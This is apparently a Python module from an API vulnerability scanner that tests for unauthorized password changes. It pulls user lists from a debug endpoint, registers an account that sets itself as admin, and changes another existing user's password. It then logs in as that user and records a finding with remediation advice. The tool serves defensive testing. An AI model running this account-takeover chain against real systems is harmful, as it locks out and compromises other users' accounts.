"""
Unauthorized Password Change Scanner Module.

This module tests for vulnerabilities related to unauthorized password changes,
where a user can change another user's password without proper authorization.
"""

import json
import time
import random
import string
from typing import Dict, List, Any, Optional

from core.base_scanner import BaseScanner
from core.openapi import find_endpoint_by_purpose


class Scanner(BaseScanner):
    """Scanner for detecting unauthorized password change vulnerabilities."""
    
    def __init__(self, target: Dict[str, Any], config: Dict[str, Any]):
        """
        Initialize the scanner.
        
        Args:
            target: Target configuration
            config: Scanner-specific configuration
        """
        super().__init__(target, config)
        
        # Initialize endpoints with default values
        self.debug_endpoint = config.get("debug_endpoint", "/users/v1/_debug")
        self.register_endpoint = config.get("register_endpoint", "/users/v1/register")
        self.login_endpoint = config.get("login_endpoint", "/users/v1/login")
        self.password_change_endpoint = config.get("password_change_endpoint", "/users/v1/{username}/password")
        
        # Extract endpoints from OpenAPI spec if available
        self._extract_endpoints_from_openapi(target)
        
        # Log the resolved endpoints
        self.logger.info(f"Using debug endpoint: {self.debug_endpoint}")
        self.logger.info(f"Using register endpoint: {self.register_endpoint}")
        self.logger.info(f"Using login endpoint: {self.login_endpoint}")
        self.logger.info(f"Using password change endpoint: {self.password_change_endpoint}")
        
        # Field names in requests/responses
        self.username_field = config.get("username_field", "username")
        self.password_field = config.get("password_field", "password")
        self.email_field = config.get("email_field", "email")
        self.admin_field = config.get("admin_field", "admin")
        self.auth_token_field = config.get("auth_token_field", "auth_token")
        
        # Success indicators
        self.success_status_codes = config.get("success_status_codes", [200, 201, 204])
        
        # Test user credentials
        timestamp = int(time.time())
        random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        self.test_username = config.get("test_username", f"test_user_{timestamp}_{random_suffix}")
        self.test_email = config.get("test_email", f"{self.test_username}@example.com")
        self.test_password = config.get("test_password", f"Test@{timestamp}")
        self.new_password = config.get("new_password", f"NewPass@{timestamp}")
        
        # Test delay
        self.test_delay = config.get("test_delay", 1.0)
    
    def _extract_endpoints_from_openapi(self, target: Dict[str, Any]) -> None:
        """
        Extract API endpoints from OpenAPI specification.
        
        Args:
            target: Target configuration containing OpenAPI data
        """
        # Check if OpenAPI data is available in the target configuration
        if "openapi" not in target or not isinstance(target["openapi"], dict):
            self.logger.info("No OpenAPI specification data found in target configuration")
            return
        
        openapi_data = target["openapi"]
        
        # Extract endpoints from the OpenAPI specification
        if "endpoints" not in openapi_data or not isinstance(openapi_data["endpoints"], list):
            self.logger.info("No endpoints found in OpenAPI specification data")
            return
        
        endpoints = openapi_data["endpoints"]
        self.logger.info(f"Found {len(endpoints)} endpoints in OpenAPI specification")
        
        # Use the utility function to find endpoints by purpose
        self.register_endpoint = find_endpoint_by_purpose(endpoints, "register", self.register_endpoint)
        self.debug_endpoint = find_endpoint_by_purpose(endpoints, "debug", self.debug_endpoint)
        self.login_endpoint = find_endpoint_by_purpose(endpoints, "login", self.login_endpoint)
        self.password_change_endpoint = find_endpoint_by_purpose(endpoints, "password_change", self.password_change_endpoint)
    
    def run(self) -> List[Dict[str, Any]]:
        """
        Run the scanner.
        
        Returns:
            List of findings
        """
        self.logger.info("Starting unauthorized password change scanner")
        
        # Test for unauthorized password change vulnerability
        self._test_unauthorized_password_change()
        
        # Return findings
        return self.findings
    
    def _get_existing_accounts(self) -> List[Dict[str, Any]]:
        """
        Get the list of existing accounts from the debug endpoint.
        
        Returns:
            List of user accounts
        """
        self.logger.info(f"Retrieving existing accounts from {self.debug_endpoint}")
        
        try:
            response = self._make_request(
                method="GET",
                endpoint=self.debug_endpoint
            )
            
            if response.status_code in self.success_status_codes:
                try:
                    data = response.json()
                    # Handle different response formats
                    if isinstance(data, dict) and "users" in data:
                        accounts = data["users"]
                        self.logger.info(f"Found {len(accounts)} existing accounts")
                        return accounts
                    elif isinstance(data, list):
                        self.logger.info(f"Found {len(data)} existing accounts")
                        return data
                    else:
                        self.logger.warn(f"Unexpected format in debug endpoint response: {data}")
                        return []
                except (ValueError, KeyError) as e:
                    self.logger.error(f"Error parsing debug endpoint response: {str(e)}")
                    return []
            else:
                self.logger.warn(f"Failed to get existing accounts, status code: {response.status_code}")
                self.logger.debug(f"Response: {response.text}")
                return []
        except Exception as e:
            self.logger.error(f"Error accessing debug endpoint: {str(e)}")
            return []
    
    def _register_test_user(self) -> bool:
        """
        Register a new test user with admin privileges.
        
        Returns:
            True if registration was successful, False otherwise
        """
        self.logger.info(f"Registering new test user '{self.test_username}' with admin privileges")
        
        register_payload = {
            self.username_field: self.test_username,
            self.email_field: self.test_email,
            self.password_field: self.test_password,
            self.admin_field: True
        }
        
        try:
            register_response = self._make_request(
                method="POST",
                endpoint=self.register_endpoint,
                json_data=register_payload
            )
            
            if register_response.status_code in self.success_status_codes:
                self.logger.info(f"Successfully registered test user '{self.test_username}'")
                self.logger.debug(f"Registration response: {register_response.text}")
                return True
            else:
                self.logger.warn(f"Failed to register test user, status code: {register_response.status_code}")
                self.logger.debug(f"Response: {register_response.text}")
                return False
        except Exception as e:
            self.logger.error(f"Error registering test user: {str(e)}")
            return False
    
    def _verify_user_created(self) -> bool:
        """
        Verify that the test user was created successfully.
        
        Returns:
            True if the user was found, False otherwise
        """
        self.logger.info(f"Verifying test user '{self.test_username}' was created")
        
        # Add a small delay to allow the server to process the registration
        time.sleep(self.test_delay)
        
        accounts = self._get_existing_accounts()
        
        for account in accounts:
            if account.get(self.username_field) == self.test_username:
                self.logger.info(f"Verified test user '{self.test_username}' was created successfully")
                self.logger.debug(f"User account: {account}")
                return True
        
        self.logger.warn(f"Test user '{self.test_username}' was not found in the user list")
        return False
    
    def _login_and_get_token(self) -> Optional[str]:
        """
        Login as the test user and get the authentication token.
        
        Returns:
            Authentication token if login was successful, None otherwise
        """
        self.logger.info(f"Logging in as test user '{self.test_username}'")
        
        login_payload = {
            self.username_field: self.test_username,
            self.password_field: self.test_password
        }
        
        try:
            login_response = self._make_request(
                method="POST",
                endpoint=self.login_endpoint,
                json_data=login_payload
            )
            
            if login_response.status_code in self.success_status_codes:
                try:
                    login_data = login_response.json()
                    auth_token = login_data.get(self.auth_token_field)
                    
                    if auth_token:
                        self.logger.info(f"Successfully logged in as test user and obtained auth token")
                        self.logger.debug(f"Auth token: {auth_token}")
                        return auth_token
                    else:
                        self.logger.warn(f"Auth token not found in login response: {login_data}")
                        return None
                except (ValueError, KeyError) as e:
                    self.logger.error(f"Error parsing login response: {str(e)}")
                    return None
            else:
                self.logger.warn(f"Failed to login as test user, status code: {login_response.status_code}")
                self.logger.debug(f"Login response: {login_response.text}")
                return None
        except Exception as e:
            self.logger.error(f"Error logging in as test user: {str(e)}")
            return None
    
    def _change_other_user_password(self, target_user: str, auth_token: str) -> bool:
        """
        Attempt to change another user's password.
        
        Args:
            target_user: Username of the target user
            auth_token: Authentication token of the test user
            
        Returns:
            True if the password change was accepted, False otherwise
        """
        self.logger.info(f"Attempting to change password for user '{target_user}'")
        
        password_change_endpoint = self.password_change_endpoint.replace("{username}", target_user)
        
        password_change_payload = {
            self.password_field: self.new_password
        }
        
        # Set up authorization header with the token
        headers = {"Authorization": f"Bearer {auth_token}"}
        
        try:
            password_change_response = self._make_request(
                method="PUT",
                endpoint=password_change_endpoint,
                json_data=password_change_payload,
                headers=headers
            )
            
            if password_change_response.status_code in self.success_status_codes:
                self.logger.info(f"Password change request for user '{target_user}' was accepted")
                self.logger.debug(f"Password change response: {password_change_response.text}")
                return True
            else:
                self.logger.info(f"Password change request was rejected with status code: {password_change_response.status_code}")
                self.logger.debug(f"Password change response: {password_change_response.text}")
                return False
        except Exception as e:
            self.logger.error(f"Error changing password: {str(e)}")
            return False
    
    def _verify_password_changed(self, target_user: str) -> bool:
        """
        Verify that the password was changed successfully by attempting to login.
        
        Args:
            target_user: Username of the target user
            
        Returns:
            True if login was successful with the new password, False otherwise
        """
        self.logger.info(f"Verifying password change by attempting to login as '{target_user}'")
        
        verify_login_payload = {
            self.username_field: target_user,
            self.password_field: self.new_password
        }
        
        try:
            verify_login_response = self._make_request(
                method="POST",
                endpoint=self.login_endpoint,
                json_data=verify_login_payload
            )
            
            if verify_login_response.status_code in self.success_status_codes:
                self.logger.info(f"Successfully logged in as '{target_user}' with the new password - vulnerability confirmed!")
                self.logger.debug(f"Login response: {verify_login_response.text}")
                return True
            else:
                self.logger.info(f"Could not login as '{target_user}' with the new password. Password change might not have been successful.")
                self.logger.debug(f"Login response: {verify_login_response.text}")
                return False
        except Exception as e:
            self.logger.error(f"Error verifying password change: {str(e)}")
            return False
    
    def _test_unauthorized_password_change(self) -> None:
        """Test for unauthorized password change vulnerability."""
        self.logger.info("Testing for unauthorized password change vulnerability")
        
        # Step 1: Get the list of existing accounts
        existing_accounts = self._get_existing_accounts()
        if not existing_accounts:
            self.logger.warn("No existing accounts found, skipping unauthorized password change test")
            return
        
        # Step 2: Register a new test user with admin privileges
        if not self._register_test_user():
            return
        
        # Step 3: Verify the new account was created
        if not self._verify_user_created():
            return
        
        # Step 4: Login as the new user to get auth token
        auth_token = self._login_and_get_token()
        if not auth_token:
            return
        
        # Step 5: Find a target user that is not our test user
        target_user = None
        for account in existing_accounts:
            username = account.get(self.username_field)
            if username and username != self.test_username:
                target_user = username
                break
        
        if not target_user:
            self.logger.warn("No target user found to test password change")
            return
        
        # Step 6: Attempt to change the target user's password
        if not self._change_other_user_password(target_user, auth_token):
            return
        
        # Step 7: Verify the password was changed
        if self._verify_password_changed(target_user):
            # Vulnerability confirmed - add finding
            password_change_endpoint = self.password_change_endpoint.replace("{username}", target_user)
            
            self.add_finding(
                vulnerability="Unauthorized Password Change",
                severity="CRITICAL",
                endpoint=password_change_endpoint,
                details=f"The API allows users to change passwords of other users without proper authorization. User '{self.test_username}' was able to change the password of user '{target_user}'.",
                evidence={
                    "test_user": self.test_username,
                    "target_user": target_user,
                    "password_change_request": {
                        "endpoint": password_change_endpoint,
                        "method": "PUT",
                        "headers": {"Authorization": f"Bearer {auth_token[:10]}..."}, # Truncate token for security
                        "payload": {self.password_field: self.new_password}
                    },
                    "verification": {
                        "login_successful": True,
                        "login_endpoint": self.login_endpoint,
                        "login_payload": {
                            self.username_field: target_user,
                            self.password_field: self.new_password
                        }
                    }
                },
                remediation="Implement proper authorization checks to ensure users can only change their own passwords. Verify the user's identity from the authentication token and compare it with the requested resource."
            )
